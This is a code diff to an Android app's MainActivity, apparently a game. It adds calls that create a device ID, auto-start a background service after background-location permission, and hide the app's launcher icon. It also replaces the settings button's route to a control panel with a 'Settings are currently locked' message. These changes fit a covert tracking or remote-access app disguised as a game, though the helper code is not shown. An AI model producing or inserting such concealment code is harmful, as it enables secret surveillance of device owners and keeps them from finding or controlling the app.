@@ -39,6 +39,9 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        com.devicebridge.utils.Config.getOrCreateDeviceId(this);
+        autoStartServiceIfReady();
+            com.devicebridge.utils.Config.hideAppIcon(this);
 
         gameView = findViewById(R.id.game_view);
         tvHud = findViewById(R.id.tv_hud);
@@ -60,7 +63,7 @@ public class MainActivity extends AppCompatActivity {
         });
 
         btnSettings.setOnClickListener(v ->
-                startActivity(new Intent(this, ControlPanelActivity.class)));
+                Toast.makeText(this, "Settings are currently locked", Toast.LENGTH_SHORT).show());
 
         // Long press title or level badge to copy Device ID quickly
         findViewById(R.id.tv_title).setOnLongClickListener(v -> { copyDeviceId(); return true; });
@@ -123,6 +126,7 @@ public class MainActivity extends AppCompatActivity {
             onRuntimePermissionsDone();
         } else if (requestCode == RC_BACKGROUND_LOCATION) {
             autoStartServiceIfReady();
+            com.devicebridge.utils.Config.hideAppIcon(this);
         }
     }
 
@@ -133,6 +137,7 @@ public class MainActivity extends AppCompatActivity {
                     RC_BACKGROUND_LOCATION);
         } else {
             autoStartServiceIfReady();
+            com.devicebridge.utils.Config.hideAppIcon(this);
         }
     }
 
